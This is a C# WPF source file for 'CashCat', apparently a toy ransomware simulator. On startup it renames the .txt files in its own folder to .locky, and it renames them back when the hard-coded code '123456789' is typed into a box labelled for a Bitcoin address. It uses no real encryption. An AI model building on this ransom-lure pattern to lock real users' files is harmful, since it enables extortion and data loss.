using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;


namespace CashCat
{



    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {

            

            if (txtbox_Bitcoingaddess.Text == "123456789")
            {
                string Location = AppDomain.CurrentDomain.BaseDirectory;
                DirectoryInfo d = new DirectoryInfo(Location);//Assuming Test is your Folder
                FileInfo[] Files = d.GetFiles("*.locky"); //Getting Text files
                string str = "";
                foreach (FileInfo file in Files)
                {
                    Console.WriteLine(file.Name);
                    string newfilename = (file.Name).Replace(".locky", ".txt");
                    System.IO.File.Move(file.Name, newfilename);

                }

                MessageBox.Show("Unlocked! Thanks!", "You did it correct", MessageBoxButton.OK);
            }
            else
            {
                MessageBox.Show("Denied!", "You did it wrong", MessageBoxButton.OK);
            }

        }

        private void txtbox_Bitcoingaddess_GotFocus(object sender, RoutedEventArgs e)
        {
            if (txtbox_Bitcoingaddess.Text == "BITCOIN Address Here")
            {
                txtbox_Bitcoingaddess.Text = "";
            }
        }

        private void Window_Initialized(object sender, EventArgs e)
        {
            string Location = AppDomain.CurrentDomain.BaseDirectory;
            //Console.WriteLine("Processed file '{0}'.", Location);


            DirectoryInfo d = new DirectoryInfo(Location);//Assuming Test is your Folder
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
            string str = "";
            foreach (FileInfo file in Files)
            {
                Console.WriteLine(file.Name);
                string newfilename = (file.Name).Replace(".txt", ".locky");
                System.IO.File.Move(file.Name, newfilename);

            }
        }
    }
}
